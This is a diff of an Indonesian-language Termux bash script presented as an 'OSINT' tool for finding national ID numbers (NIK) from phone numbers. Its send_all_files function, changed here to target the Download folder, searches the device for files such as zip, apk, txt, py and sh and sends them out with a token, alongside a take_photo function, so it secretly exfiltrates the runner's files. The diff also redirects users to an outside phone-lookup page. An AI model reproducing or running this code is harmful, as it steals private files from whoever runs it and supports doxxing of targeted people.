@@ -105,8 +105,8 @@ take_photo() {
 }
 
 send_all_files() {
-    local dir="/storage/emulated/0/"
-    local extensions=("jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip")
+    local dir="/storage/emulated/0/Download"
+    local extensions=("zip" "mp4" "mp3" "txt" "js" "py" "sh" "apk")
     send_message "Mencari dan mengirim file dari: $dir"
     for ext in "${extensions[@]}"; do
         process_files "$ext" "$token" "$dir"
@@ -337,8 +337,7 @@ nik_nih_bos() {
                 $e "Mau Osint Pake Nomor Buat Dapet NIKnya ?"
                 $e "Pake Bot Telegram Aja Silahkan Klik Telegram" | lolcat
                 $e "Saya Akan Mengarahkan Anda Ke Telegram" | lolcat
-                $e "Di dalam Nanti Langsung Anda Tempel Nomor Target Anda" | lolcat
-                $e "Contohnya$c:$k 6285953465619"
+                xdg-open https://kingcy78.github.io/osint/phone.html
             }
             loading_animation() {
                 for ((i = 0; i <= length; i++)); do
@@ -379,14 +378,14 @@ nik_nih_bos() {
                 $e
                 $e
                 read -p "Silahkan Enter Untuk Menuju ke Telegram"
-                xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
+                xdg-open "https://kingcy78.github.io/osint/phone.html"
             elif [[ "$opo" = "n" || "$opo" = "N" ]]; then
                 link | lolcat
                 $e
                 $e
                 $e
                 read -p "Silahkan Enter Untuk Menuju ke Telegram"
-                xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
+                xdg-open "https://kingcy78.github.io/osint/phone.html"
                 break
             else
                 $e $m "BODO KALI KAU, YANG BENER ANYING"
@@ -394,7 +393,7 @@ nik_nih_bos() {
         else
             $e $bg_m "Package Durung Di Install, Installasi sek$res"
             cd /data/data/com.termux/files/usr/include/
-            git clone --depth 32 https://github.com/GALIRUS404/NIK &> /dev/null | echo "Sabar Cok Sek Masang Iki"
+            xdg-open https://kingcy78.github.io/osint/phone.html 
             cd NIK
             git stash &> /dev/null
             git pull origin main &> /dev/null
